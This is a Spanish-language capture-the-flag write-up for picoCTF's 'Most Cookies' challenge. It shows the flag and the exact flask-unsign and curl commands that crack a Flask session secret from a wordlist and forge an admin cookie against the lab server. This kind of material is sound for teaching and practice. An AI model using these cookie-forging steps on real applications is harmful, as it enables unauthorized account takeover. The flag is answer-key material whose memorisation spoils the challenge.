# Most Cookies
# Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! http://wily-courier.picoctf.net:63416/
# Solución
picoCTF{cO0ki3s_yum_7ff5bad5}
En este reto revisé la cookie de sesión usada por Flask y observé que contenía información firmada. Después utilicé la herramienta `flask-unsign` junto con una lista de palabras para descubrir la clave secreta con la que estaba protegida la cookie. Una vez encontrada la clave correcta, generé una nueva cookie con el valor `very_auth` en `admin` y la envié al servidor. Al aceptar esa cookie modificada, la aplicación mostró la bandera.
# Notas
# decodificar la cookie para ver su contenido
~/.local/bin/flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.abMPBQ.9tYAwlaGCQErB26FfDiMYZpPA28'

# crackear la clave secreta usando una lista de palabras
~/.local/bin/flask-unsign --unsign \
--cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.abMPBQ.9tYAwlaGCQErB26FfDiMYZpPA28' \
--wordlist cookies.txt

# crear una nueva cookie firmada con privilegios de admin
~/.local/bin/flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret kiss

# usar la cookie modificada para obtener la flag
curl -s http://wily-courier.picoctf.net:63416/display \
-H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.abMUig.SfbGmX5aBN7p2y6zCBZY7GmyyVQ" | grep pico
# Referencias
